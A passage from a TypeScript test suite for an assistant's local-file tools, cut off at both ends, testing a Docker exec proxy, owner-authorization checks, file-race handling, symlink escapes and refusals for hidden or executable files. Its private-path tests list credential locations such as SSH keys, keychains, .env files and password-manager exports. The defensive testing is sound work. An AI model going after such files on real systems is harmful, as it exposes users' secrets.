        const payload = JSON.stringify(body);
        let head = '';
        stream.on('error', reject);
        stream.on('data', function read(chunk) {
          head += chunk.toString();
          if (!head.includes('\r\n\r\n')) return;
          stream.off('data', read);
          resolve({ head, stream });
        });
        stream.write(
          `POST /v1.44/exec/${executionId}/start HTTP/1.1\r\nHost: docker\r\nConnection: Upgrade\r\nUpgrade: tcp\r\nContent-Type: application/json\r\nContent-Length: ${Buffer.byteLength(payload)}\r\n\r\n${payload}`,
        );
      });
    const refused = await attach({ Detach: true, Tty: false });
    assert.match(refused.head, /^HTTP\/1\.1 403 /);
    refused.stream.destroy();
    const attached = await attach({ Detach: false, Tty: false });
    assert.match(attached.head, /^HTTP\/1\.1 101 /);
    assert.equal(forwarded.at(-1)!.path, `/v1.44/exec/${executionId}/start`);
    proxy.closeAllConnections();
    const echoed = await new Promise<string>((resolve, reject) => {
      attached.stream.once('data', (chunk) => resolve(chunk.toString()));
      attached.stream.once('close', () => reject(new Error('The proxy closed the exec stream.')));
      attached.stream.write('{"args":["synthetic"]}\n');
    });
    assert.equal(echoed, '{"args":["synthetic"]}\n');
    attached.stream.destroy();
  } finally {
    await Promise.all([
      new Promise<void>((resolve) => proxy.close(() => resolve())),
      new Promise<void>((resolve) => engine.close(() => resolve())),
    ]);
    await rm(root, { recursive: true, force: true });
  }
});

test('local file rules match each platform', () => {
  const windows = localFileRules(
    'win32',
    'C:\\Users\\Ada',
    'C:\\Users\\Ada\\AppData\\Roaming\\nod',
    'C:',
  );
  for (const path of [
    'C:\\',
    'C:\\Windows\\System32',
    'C:\\Program Files',
    'C:\\Users',
    'C:\\Users\\Ada\\AppData\\Local\\Temp',
    'c:\\users\\ada\\appdata',
    'C:\\Users\\Ada\\Projects\\.secrets',
    'C:\\Users\\Ada\\NTUSER.DAT',
    'C:\\Users\\Ada\\Documents\\putty.ppk',
    'D:\\Backup\\Users\\Ada\\AppData\\Roaming',
    'D:\\Photos\\Thumbs.db',
    '\\\\server\\share\\docs',
  ])
    assert.equal(windows.privatePath(path), true, path);
  for (const path of [
    'C:\\Users\\Ada',
    'C:\\Users\\Ada\\Downloads',
    'c:\\USERS\\ada\\Documents\\Tax',
    'E:\\Photos',
    'D:\\',
  ])
    assert.equal(windows.privatePath(path), false, path);
  assert.equal(windows.root('D:\\'), true);
  assert.equal(windows.root('c:\\users\\ada'), true);
  assert.equal(windows.root('C:\\Users\\Ada\\Downloads'), false);
  assert.equal(windows.executable('C:\\Users\\Ada\\Downloads\\setup.EXE', 0o644), true);
  assert.equal(windows.executable('C:\\Users\\Ada\\Downloads\\notes.txt', 0o777), false);
  const mac = localFileRules('darwin', '/Users/ada', '/Users/ada/Library/Application Support/nod');
  for (const path of [
    '/',
    '/Users',
    '/Users/ada/Library',
    '/users/ada/library/Keychains',
    '/etc',
    '/Volumes',
    '/Users/ada/Projects/.git',
    '/Users/ada/Projects/app/prod.env',
    '/Users/ada/Downloads/server.pem',
    '/Users/ada/Downloads/id_ed25519',
    '/Users/ada/Downloads/1Password Export.1pux',
    '/Users/ada/Downloads/bitwarden_export_2026.json',
    '/Volumes/Backup/Users/ada/Library/Keychains',
    '/Volumes/Backup/Backups.backupdb',
    '/Volumes/Stick/.Spotlight-V100',
  ])
    assert.equal(mac.privatePath(path), true, path);
  for (const path of [
    '/Users/ada',
    '/Users/ada/Downloads',
    '/Users/ada/Downloads/Setup.pkg',
    '/Volumes/Stick',
    '/Volumes/Stick/Photos',
  ])
    assert.equal(mac.privatePath(path), false, path);
  assert.equal(mac.root('/Volumes/Stick'), true);
  assert.equal(mac.root('/Users/ada'), true);
  assert.equal(mac.holdsData('/Users/ada'), true);
  assert.equal(mac.holdsData('/Users/ada/Downloads'), false);
  const linux = localFileRules('linux', '/home/ada', '/home/ada/nod/.local');
  assert.equal(linux.privatePath('/home/ada/Downloads'), false);
  for (const path of [
    '/media',
    '/media/ada',
    '/run/media/ada',
    '/mnt/Stick',
    '/media/ada/Stick/.Trash-1000',
  ])
    assert.equal(linux.privatePath(path), true, path);
  for (const path of ['/media/ada/Stick', '/media/ada/Stick/Photos', '/run/media/ada/Stick'])
    assert.equal(linux.privatePath(path), false, path);
  assert.equal(linux.root('/media/ada/Stick'), true);
  assert.equal(linux.root('/run/media/ada/Stick/Photos'), false);
  assert.equal(linux.privatePath('/home/ada/nod/.local/keys'), true);
  assert.equal(linux.holdsData('/home/ada/nod'), true);
  for (const suffix of ['flatpak', 'flatpakref', 'flatpakrepo'])
    assert.equal(linux.executable(`/home/ada/Downloads/Nod.${suffix}`, 0o644), true);
  assert.equal(linux.executable('/home/ada/Downloads/notes.txt', 0o644), false);
});

test('local files require owner evidence for a schedule, including approval-only schedules', async () => {
  let authority: import('../src/server/owner-instructions.ts').OwnerInstructions | null = null;
  const pool = {
    query: async (sql: string) => {
      if (sql.startsWith('WITH RECURSIVE'))
        return {
          rows: [{ id: 'schedule-turn', source: 'schedule', message_id: null, proactive: false }],
        };
      if (sql.startsWith('SELECT authority')) return { rows: [{ authority }] };
      assert.fail('Unexpected source query.');
    },
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    dataRoot: '/tmp/synthetic-nod',
    home: '/tmp/synthetic-home',
  });
  const turn = { turnId: 'schedule-turn', threadId: 'synthetic-thread' };
  for (const value of [
    null,
    { messages: [] },
    {
      messages: [
        { id: null, at: '2026-11-14T09:00:00Z', text: 'Background only.', canAuthorize: false },
      ],
    },
  ]) {
    authority = value;
    await assert.rejects(files.assertStartedByOwner(turn), /work the owner started/);
  }
  authority = {
    messages: [],
    approvals: [
      {
        id: 'synthetic-approval',
        at: '2026-11-14T09:00:00Z',
        definition: { prompt: 'Read the synthetic board.' },
      },
    ],
  };
  await files.assertStartedByOwner(turn);
  authority = {
    messages: [{ id: null, at: '2026-11-14T09:00:00Z', text: 'Read the synthetic board.' }],
  };
  await files.assertStartedByOwner(turn);
  authority.requiresReplacement = true;
  await assert.rejects(files.assertStartedByOwner(turn), /changes without source records/);
});

test('local file reads refuse a write that occurs before the read completes', async (t) => {
  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-read-race-')));
  t.after(() => rm(home, { recursive: true, force: true }));
  const path = join(home, 'note.txt');
  await writeFile(path, 'old');
  const timestamp = new Date('2026-01-01T00:00:00Z');
  await utimes(path, timestamp, timestamp);
  const pool = {
    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    home,
    dataRoot: join(home, 'data'),
    available: true,
  });
  const checked = await files.prepare('LOCAL_FILES_READ', { path });
  const handle = await open(path, 'r');
  const prototype = Object.getPrototypeOf(handle) as typeof handle;
  const read = prototype.read;
  await handle.close();
  const fields = ['dev', 'ino', 'size', 'mtimeNs', 'ctimeNs'] as const;
  const version = (info: BigIntStats) => fields.map((key) => String(info[key]));
  let writes = 0;
  let observed: unknown;
  const intercepted = t.mock.method(
    prototype,
    'read',
    async function (this: typeof handle, ...args: Parameters<typeof handle.read>) {
      const result = await Reflect.apply(read, this, args);
      const before = await this.stat({ bigint: true });
      await writeFile(path, 'new');
      await utimes(path, timestamp, new Date(timestamp.getTime() + 1000));
      writes++;
      const after = await this.stat({ bigint: true });
      assert.notEqual(after.mtimeNs, before.mtimeNs);
      observed = {
        before: version(before),
        after: version(after),
        path: version(await lstat(path, { bigint: true })),
      };
      return result;
    },
  );
  try {
    const result = await files.execute('LOCAL_FILES_READ', checked).then(
      (value) => ({ value, error: undefined }),
      (error: unknown) => ({ value: undefined, error }),
    );
    assert.equal(writes, 1);
    assert.equal(
      (result.error as { notRun?: boolean } | undefined)?.notRun,
      true,
      JSON.stringify({ observed, result: result.value }),
    );
  } finally {
    intercepted.mock.restore();
  }
});

test('local file opening failures return no bytes and permit a fresh read', async (t) => {
  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-read-open-race-')));
  t.after(() => rm(home, { recursive: true, force: true }));
  const path = join(home, 'note.txt');
  const target = join(home, 'other.txt');
  await writeFile(target, 'other private content');
  const pool = {
    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    home,
    dataRoot: join(home, 'data'),
    available: true,
  });
  const handle = await open(target, 'r');
  const prototype = Object.getPrototypeOf(handle) as typeof handle;
  const read = prototype.read;
  await handle.close();
  let reads = 0;
  let closes = 0;
  let readFailure: Error | undefined;
  t.mock.method(
    prototype,
    'read',
    function (this: typeof handle, ...args: Parameters<typeof read>) {
      reads++;
      if (readFailure) throw readFailure;
      return Reflect.apply(read, this, args);
    },
  );
  const originalOpen = fs.open;
  for (const action of ['LOCAL_FILES_READ', 'LOCAL_FILES_IMPORT'] as const) {
    for (const race of [
      'removed',
      'symlink',
      'replaced',
      'open failure',
      'stat failure',
      'version failure',
      'read failure',
      'final stat failure',
      'close failure',
      'target removed',
      'target retargeted',
    ]) {
      await writeFile(path, 'old');
      const checked = await files.prepare(action, { path });
      assert.deepEqual(await files.prepare(action, checked), checked);
      if (race.startsWith('target ')) {
        await rm(path);
        if (race === 'target retargeted') await symlink(target, path);
      }
      const failure = Object.assign(new Error('EIO: synthetic file opening failed'), {
        code: 'EIO',
        statusCode: 503,
      });
      const uncertain = ['read failure', 'final stat failure', 'close failure'].includes(race);
      readFailure = race === 'read failure' ? failure : undefined;
      let restoreStat = () => {};
      let restoreClose = () => {};
      let opened = false;
      let opens = 0;
      const intercepted = t.mock.method(fs, 'open', async (...args: Parameters<typeof fs.open>) => {
        if (args[0] !== path) return Reflect.apply(originalOpen, fs, args);
        opens++;
        if (race === 'open failure') throw failure;
        if (['removed', 'symlink', 'replaced'].includes(race)) await rm(path);
        if (race === 'symlink') await symlink(target, path);
        if (race === 'replaced') await writeFile(path, 'replacement');
        const file = await Reflect.apply(originalOpen, fs, args);
        opened = true;
        const originalClose = file.close;
        const close = t.mock.method(file, 'close', async () => {
          closes++;
          const result = await Reflect.apply(originalClose, file, []);
          if (race === 'close failure') throw failure;
          return result;
        });
        restoreClose = () => close.mock.restore();
        if (
          race === 'stat failure' ||
          race === 'version failure' ||
          race === 'final stat failure'
        ) {
          const originalStat = file.stat;
          let versionChecks = 0;
          const stat = t.mock.method(
            file,
            'stat',
            async (...args: Parameters<typeof file.stat>) => {
              if (
                race === 'stat failure' ||
                (args[0]?.bigint && (++versionChecks === 2 || race === 'version failure'))
              )
                throw failure;
              return Reflect.apply(originalStat, file, args);
            },
          );
          restoreStat = () => stat.mock.restore();
        }
        return file;
      });
      syncBuiltinESMExports();
      reads = 0;
      const closesBefore = closes;
      try {
        await assert.rejects(files.execute(action, checked), (error: unknown) => {
          assert.ok(error instanceof Error);
          assert.equal((error as { notRun?: boolean }).notRun, uncertain ? undefined : true, race);
          if (race.endsWith('failure')) {
            assert.equal(error, failure);
            assert.equal(failure.code, 'EIO');
            assert.equal(failure.statusCode, 503);
          }
          return true;
        });
        assert.equal(reads, Number(uncertain));
        if (race.startsWith('target ')) assert.equal(opens, 0);
        assert.equal(closes, closesBefore + Number(opened));
      } finally {
        readFailure = undefined;
        restoreStat();
        restoreClose();
        intercepted.mock.restore();
        syncBuiltinESMExports();
      }
      await rm(path, { force: true });
      await writeFile(path, 'fresh');
      const result = (await files.execute(action, await files.prepare(action, { path }))) as {
        text?: string;
        file?: { bytes: Uint8Array };
      };
      assert.equal(result.text ?? Buffer.from(result.file!.bytes).toString(), 'fresh');
    }
  }
});

test('local file reads refuse a parent folder replacement after opening', async (t) => {
  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-read-path-race-')));
  t.after(() => rm(home, { recursive: true, force: true }));
  const pool = {
    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    home,
    dataRoot: join(home, 'data'),
    available: true,
  });
  for (const action of ['LOCAL_FILES_READ', 'LOCAL_FILES_IMPORT'] as const) {
    for (const missing of [false, true]) {
      const folder = join(home, `${action}-${missing}`);
      const path = join(folder, 'note.txt');
      await mkdir(folder);
      await writeFile(path, 'old');
      const checked = await files.prepare(action, { path });
      const handle = await open(path, 'r');
      const prototype = Object.getPrototypeOf(handle) as typeof handle;
      const read = prototype.read;
      await handle.close();
      const intercepted = t.mock.method(
        prototype,
        'read',
        async function (this: typeof handle, ...args: Parameters<typeof handle.read>) {
          const result = await Reflect.apply(read, this, args);
          const before = await this.stat({ bigint: true });
          await rename(folder, `${folder}-old`);
          if (!missing) {
            await mkdir(folder);
            await writeFile(path, 'new');
          }
          const after = await this.stat({ bigint: true });
          assert.deepEqual(
            [after.dev, after.ino, after.size, after.mtimeNs, after.ctimeNs],
            [before.dev, before.ino, before.size, before.mtimeNs, before.ctimeNs],
          );
          return result;
        },
      );
      try {
        await assert.rejects(files.execute(action, checked), (error: unknown) => {
          assert.ok(error instanceof Error);
          assert.equal((error as { notRun?: boolean }).notRun, true);
          assert.match(error.message, /changed after this file read/);
          if (missing) assert.match(error.message, /ENOENT/);
          return true;
        });
      } finally {
        intercepted.mock.restore();
      }
      assert.equal(await readFile(join(`${folder}-old`, 'note.txt'), 'utf8'), 'old');
      if (!missing) {
        const current = (await files.execute(action, await files.prepare(action, { path }))) as {
          text?: string;
          file?: { bytes: Uint8Array };
        };
        assert.equal(
          action === 'LOCAL_FILES_READ'
            ? current.text
            : new TextDecoder().decode(current.file!.bytes),
          'new',
        );
      }
    }
  }
});

test('local file version checks keep the cause of a failed path check', async (t) => {
  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-read-path-error-')));
  t.after(() => rm(home, { recursive: true, force: true }));
  const path = join(home, 'note.txt');
  await writeFile(path, 'synthetic text');
  const pool = {
    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    home,
    dataRoot: join(home, 'data'),
    available: true,
  });
  const originalLstat = fs.lstat;
  for (const action of ['LOCAL_FILES_READ', 'LOCAL_FILES_IMPORT'] as const) {
    const checked = await files.prepare(action, { path });
    for (const code of ['ENOENT', 'EIO', 'EMFILE', 'EACCES']) {
      const failure = Object.assign(new Error(`${code}: synthetic preparation check failed`), {
        code,
        statusCode: 503,
      });
      const intercepted = t.mock.method(fs, 'lstat', (...args: Parameters<typeof fs.lstat>) => {
        if (args[0] === path && args[1]?.bigint) return Promise.reject(failure);
        return Reflect.apply(originalLstat, fs, args);
      });
      syncBuiltinESMExports();
      try {
        await assert.rejects(files.prepare(action, checked), (error: unknown) => {
          assert.ok(error instanceof Error);
          if (code === 'ENOENT') {
            assert.equal((error as { notRun?: boolean }).notRun, true);
            assert.equal((error as { statusCode?: number }).statusCode, 409);
            assert.match(error.message, /changed after this file read/);
            assert.ok(error.message.includes(failure.message));
          } else assert.equal(error, failure);
          return true;
        });
      } finally {
        intercepted.mock.restore();
        syncBuiltinESMExports();
      }
    }
    for (const code of ['EIO', 'EMFILE', 'EACCES']) {
      for (const failedCheck of [1, 2]) {
        let checks = 0;
        const failure = Object.assign(new Error(`${code}: synthetic path check failed`), {
          code,
          statusCode: 503,
        });
        const intercepted = t.mock.method(fs, 'lstat', (...args: Parameters<typeof fs.lstat>) => {
          if (args[0] === path && args[1]?.bigint && ++checks === failedCheck)
            return Promise.reject(failure);
          return Reflect.apply(originalLstat, fs, args);
        });
        syncBuiltinESMExports();
        try {
          await assert.rejects(files.execute(action, checked), (error: unknown) => {
            assert.equal(error, failure);
            assert.equal(
              (error as { notRun?: boolean }).notRun,
              failedCheck === 1 ? true : undefined,
            );
            assert.equal(failure.code, code);
            assert.equal(failure.statusCode, 503);
            assert.doesNotMatch(failure.message, /changed after this file read/);
            return true;
          });
          assert.equal(checks, failedCheck);
        } finally {
          intercepted.mock.restore();
          syncBuiltinESMExports();
        }
      }
    }
  }
});

test('a folder moved to another drive keeps a file that arrives during the copy', async (t) => {
  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-cross-drive-')));
  t.after(() => rm(home, { recursive: true, force: true }));
  const source = join(home, 'box');
  await mkdir(join(source, 'inner'), { recursive: true });
  await writeFile(join(source, 'inner', 'a.txt'), 'a');
  const pool = {
    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    home,
    dataRoot: join(home, 'data'),
    available: true,
  });
  const { rename: originalRename, cp: originalCp } = fs;
  const crossDrive = Object.assign(new Error('EXDEV: cross-device link not permitted'), {
    code: 'EXDEV',
  });
  const renamed = t.mock.method(fs, 'rename', (...args: Parameters<typeof fs.rename>) =>
    args[0] === source ? Promise.reject(crossDrive) : Reflect.apply(originalRename, fs, args),
  );
  const copied = t.mock.method(fs, 'cp', async (...args: Parameters<typeof fs.cp>) => {
    await writeFile(join(source, 'late.txt'), 'late');
    return Reflect.apply(originalCp, fs, args);
  });
  syncBuiltinESMExports();
  try {
    const result = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: source, to: join(home, 'crate') }],
    })) as { failed: unknown[] };
    assert.equal(result.failed.length, 1);
  } finally {
    renamed.mock.restore();
    copied.mock.restore();
    syncBuiltinESMExports();
  }
  assert.equal(await readFile(join(home, 'crate', 'inner', 'a.txt'), 'utf8'), 'a');
  assert.equal(await readFile(join(source, 'late.txt'), 'utf8'), 'late');
  assert.ok(!existsSync(join(source, 'inner')));
});

test('local imports reject changed and oversized files before reading bytes', async (t) => {
  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-import-size-')));
  t.after(() => rm(home, { recursive: true, force: true }));
  const path = join(home, 'note.txt');
  await writeFile(path, 'old');
  const pool = {
    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    home,
    dataRoot: join(home, 'data'),
    available: true,
  });
  const checked = await files.prepare('LOCAL_FILES_IMPORT', { path });
  const handle = await open(path, 'r');
  const prototype = Object.getPrototypeOf(handle) as typeof handle;
  const read = prototype.read;
  await handle.close();
  let reads = 0;
  const intercepted = t.mock.method(
    prototype,
    'read',
    function (this: typeof handle, ...args: Parameters<typeof handle.read>) {
      reads++;
      return Reflect.apply(read, this, args);
    },
  );
  try {
    await truncate(path, fileBytes + 1);
    await assert.rejects(files.execute('LOCAL_FILES_IMPORT', checked), {
      statusCode: 409,
      notRun: true,
    });
    const oversized = await files.prepare('LOCAL_FILES_IMPORT', { path });
    await assert.rejects(files.execute('LOCAL_FILES_IMPORT', oversized), (error: unknown) => {
      assert.ok(error instanceof Error);
      assert.match(error.message, /Files up to .* MB can be copied/);
      assert.equal((error as { notRun?: boolean }).notRun, true);
      return true;
    });
    assert.equal(reads, 0);
    await writeFile(path, 'new');
    const current = (await files.execute(
      'LOCAL_FILES_IMPORT',
      await files.prepare('LOCAL_FILES_IMPORT', { path }),
    )) as { file: { bytes: Uint8Array } };
    assert.equal(new TextDecoder().decode(current.file.bytes), 'new');
    assert.equal(reads, 1);
  } finally {
    intercepted.mock.restore();
  }
});

test('local files stay in home, skip secrets and kept-out folders, and never overwrite', async () => {
  const base = await realpath(await mkdtemp(join(tmpdir(), 'nod-local-files-')));
  const home = join(base, 'home');
  const shared = join(home, 'Downloads');
  const outside = join(base, 'outside');
  const trash = join(base, 'trash');
  await mkdir(join(shared, 'sorted'), { recursive: true });
  await mkdir(outside);
  await writeFile(join(shared, 'a.txt'), 'a');
  await writeFile(join(shared, 'sorted', 'a.txt'), 'kept');
  await writeFile(join(outside, 'secret.txt'), 'secret');
  await symlink(outside, join(shared, 'escape'));
  const data = join(base, 'data');
  await mkdir(join(data, 'keys'), { recursive: true });
  const keep: string[] = [];
  let enabled = false;
  const pool = {
    query: async (sql: string, values: string[]) => {
      if (sql.startsWith('SELECT local_files_enabled')) {
        assert.equal(values[0], 'owner');
        return { rows: [{ local_files_enabled: enabled }] };
      }
      if (sql.startsWith('WITH RECURSIVE'))
        return { rows: [{ id: values[0], source: 'user', message_id: 'm', proactive: false }] };
      if (sql.startsWith('INSERT') && !keep.includes(values[1]!)) keep.push(values[1]!);
      return { rows: [{ local_keep_out: [...keep] }] };
    },
  } as unknown as Pool;
  const files = createLocalFiles(pool, 'owner', {
    dataRoot: data,
    home,
    trash: {
      ready: async () => true,
      put: async (path) => {
        if (basename(path) === 'stuck.txt') throw new Error('Synthetic Trash failure');
        await mkdir(trash, { recursive: true });
        await rename(path, join(trash, basename(path)));
        if (basename(path) === 'late.txt') throw new Error('The Trash did not answer.');
      },
    },
  });
  const turn = { turnId: 'turn', threadId: 'thread' };
  try {
    await assert.rejects(files.prepare('LOCAL_FILES_LIST', { path: outside }), /access is off/);
    await assert.rejects(files.execute('LOCAL_FILES_READ', { path: outside }), /access is off/);
    enabled = true;
    const prepared = await files.prepare('LOCAL_FILES_WRITE', {
      path: join(shared, 'blocked.txt'),
      text: 'Synthetic file',
    });
    enabled = false;
    await assert.rejects(files.execute('LOCAL_FILES_WRITE', prepared), /access is off/);
    assert.equal(existsSync(join(shared, 'blocked.txt')), false);
    enabled = true;
    for (const path of [undefined, null, 42])
      await assert.rejects(
        files.keepOut(turn, path as unknown as string, pool),
        /Name the absolute path/,
      );
    assert.deepEqual(keep, []);
    assert.ok(
      ((await files.execute('LOCAL_FILES_LIST', { path: home })) as { entries: unknown[] }).entries
        .length,
    );
    for (const path of [base, data, join(data, 'keys'), '/etc'])
      await assert.rejects(files.execute('LOCAL_FILES_LIST', { path }), /outside your home/);
    await assert.rejects(files.prepare('LOCAL_FILES_TRASH', { paths: [home] }), /root of a drive/);
    await assert.rejects(
      files.prepare('LOCAL_FILES_TRASH', {
        paths: [join(shared, 'a.txt'), join(outside, 'secret.txt')],
      }),
      /outside your home/,
    );
    const observation = await files.prepare('LOCAL_FILES_READ', {
      path: `${shared}/sorted/../a.txt`,
    });
    assert.ok('path' in observation);
    assert.equal(observation.path, join(shared, 'a.txt'));
    assert.deepEqual(
      await files.prepare('LOCAL_FILES_READ', { path: '~/Downloads/a.txt' }),
      observation,
    );
    for (const action of ['LOCAL_FILES_READ', 'LOCAL_FILES_IMPORT'] as const) {
      const path = join(shared, 'versioned.txt');
      await writeFile(path, 'old');
      const timestamp = new Date('2026-01-01T00:00:00Z');
      await utimes(path, timestamp, timestamp);
      const original = await lstat(path, { bigint: true });
      const checked = await files.prepare(action, { path });
      assert.ok('version' in checked);
      await assert.rejects(files.execute(action, { path }), { notRun: true });
      let changed = original;
      for (let attempt = 0; attempt < 100 && changed.ctimeNs === original.ctimeNs; attempt++) {
        await writeFile(path, 'new');
        await utimes(path, timestamp, timestamp);
        changed = await lstat(path, { bigint: true });
        if (changed.ctimeNs === original.ctimeNs) await delay(10);
      }
      assert.equal(changed.mtimeNs, original.mtimeNs);
      assert.equal(changed.size, original.size);
      assert.notEqual(changed.ctimeNs, original.ctimeNs);
      await assert.rejects(files.prepare(action, checked), { notRun: true });
      await assert.rejects(files.execute(action, checked), { notRun: true });
      const current = await files.prepare(action, { path });
      assert.ok('version' in current);
      assert.notEqual(current.version, checked.version);
      const read = (await files.execute(action, current)) as {
        text?: string;
        file?: { bytes: Uint8Array };
      };
      assert.equal(read.text ?? Buffer.from(read.file!.bytes).toString(), 'new');
      await rename(path, join(shared, 'versioned-old.txt'));
      await writeFile(path, 'replacement');
      await assert.rejects(files.execute(action, current), /changed after this file read/);
      const controller = new AbortController();
      const pending = await files.prepare(action, { path });
      controller.abort();
      await assert.rejects(files.execute(action, pending, { signal: controller.signal }), {
        name: 'AbortError',
      });
    }
    assert.deepEqual(
      await files.prepare('LOCAL_FILES_MOVE', {
        moves: [{ from: '~/Downloads/a.txt', to: '~/Downloads/b.txt' }],
      }),
      { moves: [{ from: join(shared, 'a.txt'), to: join(shared, 'b.txt') }] },
    );
    await assert.rejects(files.prepare('LOCAL_FILES_READ', { path: '~root/a.txt' }), /absolute/);
    for (const path of [outside, join(shared, '..', '..', 'outside'), join(shared, 'escape')])
      await assert.rejects(files.execute('LOCAL_FILES_LIST', { path }), /outside your home/);
    await assert.rejects(
      files.execute('LOCAL_FILES_READ', { path: join(shared, 'escape', 'secret.txt') }),
      /outside your home/,
    );
    const moved = await files.execute('LOCAL_FILES_MOVE', {
      moves: [
        { from: join(shared, 'a.txt'), to: join(shared, 'sorted', 'a.txt') },
        { from: join(shared, 'a.txt'), to: join(shared, 'escape', 'a.txt') },
        { from: join(outside, 'secret.txt'), to: join(shared, 'secret.txt') },
        { from: shared, to: join(shared, 'sorted', 'inner') },
      ],
    });
    assert.deepEqual((moved as { moved: unknown[] }).moved, []);
    assert.equal((moved as { failed: unknown[] }).failed.length, 4);
    assert.equal(await readFile(join(shared, 'sorted', 'a.txt'), 'utf8'), 'kept');
    assert.equal(await readFile(join(outside, 'secret.txt'), 'utf8'), 'secret');
    const trashed = await files.execute('LOCAL_FILES_TRASH', {
      paths: [join(shared, 'escape'), join(outside, 'secret.txt')],
    });
    assert.equal((trashed as { failed: unknown[] }).failed.length, 1);
    assert.ok(existsSync(join(outside, 'secret.txt')));
    assert.ok(!existsSync(join(shared, 'escape')));
    await symlink(join(outside, 'secret.txt'), join(shared, 'link.txt'));
    for (const path of [join(shared, 'link.txt'), join(shared, '..', 'outside', 'new.txt')])
      await assert.rejects(
        files.execute('LOCAL_FILES_WRITE', { path, text: 'x', overwrite: true }),
      );
    await assert.rejects(
      files.execute('LOCAL_FILES_EDIT', {
        path: join(shared, 'link.txt'),
        edits: [{ oldText: 'secret', newText: 'x' }],
      }),
    );
    assert.equal(await readFile(join(outside, 'secret.txt'), 'utf8'), 'secret');
    const note = join(shared, 'note.txt');
    await files.execute('LOCAL_FILES_WRITE', { path: note, text: 'one two two' });
    await assert.rejects(
      files.execute('LOCAL_FILES_WRITE', { path: note, text: 'lost' }),
      /exists/,
    );
    await assert.rejects(
      files.execute('LOCAL_FILES_EDIT', { path: note, edits: [{ oldText: 'two', newText: '2' }] }),
      /exactly once/,
    );
    await files.execute('LOCAL_FILES_EDIT', {
      path: note,
      edits: [{ oldText: 'one', newText: '1' }],
    });
    assert.equal(await readFile(note, 'utf8'), '1 two two');
    assert.equal(await readFile(join(trash, 'note.txt'), 'utf8'), 'one two two');
    const latin = join(shared, 'latin.txt');
    await writeFile(latin, Buffer.from([0x63, 0x61, 0x66, 0xe9]));
    await assert.rejects(
      files.execute('LOCAL_FILES_EDIT', { path: latin, edits: [{ oldText: 'caf', newText: 'x' }] }),
      /UTF-8/,
    );
    assert.deepEqual([...(await readFile(latin))], [0x63, 0x61, 0x66, 0xe9]);
    await mkdir(join(shared, 'app', '.git', 'hooks'), { recursive: true });
    await writeFile(join(shared, '.env'), 'TOKEN=x');
    const hook = join(shared, 'app', '.git', 'hooks', 'pre-commit');
    await assert.rejects(
      files.execute('LOCAL_FILES_READ', { path: join(shared, '.env') }),
      /hidden/,
    );
    await assert.rejects(files.execute('LOCAL_FILES_WRITE', { path: hook, text: 'x' }), /hidden/);
    const hidden = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: note, to: join(shared, '.note') }],
    })) as { failed: Array<{ error: string }> };
    assert.match(hidden.failed[0]!.error, /hidden/);
    const listed = (await files.execute('LOCAL_FILES_LIST', { path: shared })) as {
      entries: Array<{ name: string }>;
    };
    assert.ok(!listed.entries.some((item) => item.name.startsWith('.')));
    const script = join(shared, 'deploy.sh');
    await writeFile(script, 'echo ok', { mode: 0o755 });
    await assert.rejects(
      files.execute('LOCAL_FILES_EDIT', { path: script, edits: [{ oldText: 'ok', newText: 'x' }] }),
      /executable/,
    );
    assert.equal(await readFile(script, 'utf8'), 'echo ok');
    await symlink(outside, join(shared, 'away'));
    await assert.rejects(
      files.execute('LOCAL_FILES_READ', { path: join(shared, 'away', 'secret.txt') }),
      (error: Error) => !error.message.includes(outside),
    );
    const imported = (await files.execute(
      'LOCAL_FILES_IMPORT',
      await files.prepare('LOCAL_FILES_IMPORT', { path: latin }),
    )) as {
      file: { name: string; bytes: Uint8Array };
    };
    assert.equal(imported.file.name, 'latin.txt');
    assert.deepEqual([...imported.file.bytes], [0x63, 0x61, 0x66, 0xe9]);
    const exported = join(shared, 'report.pdf');
    const file = { workspaceFile: '/workspace/report.pdf', mimeType: 'application/pdf' };
    await files.execute(
      'LOCAL_FILES_EXPORT',
      { file, path: exported },
      { read: async () => new Uint8Array([1, 2, 3]) },
    );
    assert.deepEqual([...(await readFile(exported))], [1, 2, 3]);
    await assert.rejects(
      files.execute(
        'LOCAL_FILES_EXPORT',
        { file, path: exported },
        { read: async () => new Uint8Array([4]) },
      ),
      /exists/,
    );
    await assert.rejects(
      files.execute(
        'LOCAL_FILES_WRITE',
        { path: join(shared, 'stopped.txt'), text: 'x' },
        { signal: AbortSignal.abort() },
      ),
    );
    assert.equal(existsSync(join(shared, 'stopped.txt')), false);
    await assert.rejects(
      files.execute('LOCAL_FILES_WRITE', {
        path: join(shared, 'big.txt'),
        text: 'é'.repeat(600_000),
      }),
      /at most 1 MB/,
    );
    await writeFile(join(shared, 'taken.txt'), 'taken');
    await symlink(join(shared, 'a-target.txt'), join(shared, 'pointer'));
    const linkMove = (await files.execute('LOCAL_FILES_MOVE', {
      moves: [{ from: join(shared, 'pointer'), to: join(shared, 'taken.txt') }],
    })) as { failed: Array<{ error: string }> };
    assert.match(linkMove.failed[0]!.error, /already exists/);
    assert.equal(await readFile(join(shared, 'taken.txt'), 'utf8'), 'taken');
    for (const path of [join(shared, 'run.sh'), join(shared, 'sorted', 'tool.sh')])
      await assert.rejects(
        files.execute('LOCAL_FILES_WRITE', { path, text: 'echo hi' }),
        /program or shortcut/,
      );
    const renamed = (await files.execute('LOCAL_FILES_MOVE', {
